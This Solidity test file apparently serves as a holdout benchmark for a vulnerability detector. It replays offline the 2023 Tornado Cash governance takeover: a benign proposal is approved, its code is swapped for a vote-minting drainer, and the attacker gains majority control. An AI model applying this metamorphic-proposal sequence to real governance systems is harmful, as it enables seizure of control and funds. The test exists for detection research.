// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {
    GovToken,
    BenignProposalLogic,
    MaliciousProposalLogic,
    MetamorphicProposal,
    GovernanceClone
} from "../fixtures/create2-metamorphic/b-incident/TornadoGovernanceClone.sol";

/// @title create2-metamorphic (b) real-incident HOLDOUT: Tornado Cash governance takeover (2023-05-20).
/// @notice Minimized OFFLINE replay (no live RPC) of the metamorphic governance attack: a proposal
///         is approved while its deterministic address holds benign code, the attacker mutates that
///         code to a drainer, and executing the (still-approved) proposal mints the attacker an
///         overwhelming vote balance - seizing governance. The verdict is derived from the real
///         outcome (attacker ends with majority voting power), not hardcoded. See PROVENANCE.md.
///
///         HOLDOUT: authored after the wal detectors froze at v0.1; wal was NOT tuned to pass it.
contract TornadoGovernanceIncidentTest is Test {
    // One of the two documented attacker EOAs from the post-mortem (see PROVENANCE.md).
    address constant ATTACKER = 0x092123663804f8801b9b086b03B98D706f77bD59;

    uint256 constant HONEST_VOTES = 700_000e18;  // ~700k legitimate votes (reported)
    uint256 constant GRAB = 1_200_000e18;        // ~1.2M fake votes the attacker manufactured (reported)

    function _report(string memory target, bool taken) internal pure {
        console.log(
            string.concat(
                "[create2-metamorphic] target=", target, " verdict=", taken ? "VULNERABLE" : "BLOCKED"
            )
        );
    }

    function test_tornadoGovernanceIncident_isTakenOver() public {
        GovToken token = new GovToken();
        GovernanceClone gov = new GovernanceClone(token);

        // Honest token holders hold the governance majority before the attack.
        token.mint(address(0xA11CE), HONEST_VOTES);
        uint256 honestBefore = token.votesOf(address(0xA11CE));

        // Attacker publishes a proposal whose logic address holds benign ("emergency stop") code;
        // it looks identical to a previously trusted proposal, so holders vote it in.
        vm.startPrank(ATTACKER);
        BenignProposalLogic benign = new BenignProposalLogic();
        MetamorphicProposal proposal = new MetamorphicProposal(address(benign));
        vm.stopPrank();

        gov.approve(address(proposal)); // vote passes -> proposal approved at its fixed address

        // After approval, the attacker mutates the code at that same address to a drainer.
        vm.startPrank(ATTACKER);
        MaliciousProposalLogic malicious = new MaliciousProposalLogic(ATTACKER, GRAB);
        proposal.swapCode(address(malicious));
        vm.stopPrank();

        // Governance executes the approved proposal - now running the mutated, hostile code.
        gov.execute();

        uint256 attackerVotes = token.votesOf(ATTACKER);
        bool takenOver = attackerVotes >= honestBefore && attackerVotes > 0;
        _report("tornado-governance-victim", takenOver);

        assertTrue(takenOver, "mutated proposal should mint the attacker a controlling vote balance");
        assertEq(attackerVotes, GRAB, "attacker minted himself the grabbed votes");
        assertGe(attackerVotes, honestBefore, "attacker now matches/exceeds the honest majority");
    }
}
